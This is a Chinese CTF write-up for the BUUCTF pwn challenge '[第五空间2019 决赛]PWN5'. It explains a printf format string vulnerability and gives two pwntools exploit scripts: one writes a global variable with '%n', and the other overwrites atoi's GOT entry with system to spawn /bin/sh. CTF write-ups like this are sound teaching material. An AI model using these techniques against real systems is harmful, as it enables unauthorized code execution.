---
title: "BUUCTF Pwn [第五空间2019 决赛]PWN5"
date: 2020-02-12T19:24:40+08:00
author: NiceSeven
categories:
  - BUUCTF
tags:
  - Pwn
---

# 5th_space_2019_final_pwn5

![image-20200212192653235](/images/image-20200212192653235.png)

printf(&buf)，明显格式化字符串漏洞，了解atoi函数

该题有两种解法

1、第一个read利用格式化字符串漏洞修改unk_804c044的值，第二个read输入我们修改的值去满足if判断执行system('/bin/sh\')

2、第一个read利用格式化字符串漏洞修改atoi_got为system_plt，第二次read输入"/bin/sh\x00\"，执行system('/bin/sh\')

exp1

```python
#!/usr/bin/env python2
#-*-conding=UTF-8-*-

from pwn import *

sh = remote('node3.buuoj.cn',29326)
target_addr = 0x0804c044
payload = p32(target_addr) + '%10$n' #target_addr = 4byte 4=0x00000004
sh.recvuntil("your name:")
sh.sendline(payload)
sh.recvuntil("your passwd:")
sh.sendline(str(0x00000004))#atoi函数将数字
sh.interactive()
```

![image-20200212194221114](/images/image-20200212194221114.png)

exp2

```python
#!/usr/bin/env python2
#-*-coding=UTF-8-*-

from pwn import *
#context(log_level='debug')
elf = ELF('./pwn5')
sh = remote('node3.buuoj.cn',29326)

atoi_got_addr = elf.got['atoi']
system_plt_addr = elf.plt['system']

log.success('atoi_got_addr => {}'.format(hex(atoi_got_addr)))
log.success('system_plt_addr => {}'.format(hex(system_plt_addr)))

format_string_offset = 10
payload = fmtstr_payload(format_string_offset,{atoi_got_addr:system_plt_addr})
'''
fmtstr_payload()自动生成格式化字符串漏洞相应的payload
这里是将atoi_got_addr修改为system_plt_addr,从而执行system()
'''
#print payload

sh.recvuntil('your name:')
sh.sendline(payload)

sh.recvuntil('your passwd:')
sh.sendline('/bin/sh\x00')#利用第二个read向system传参

sh.interactive()
```

![image-20200212194300620](/images/image-20200212194300620.png)

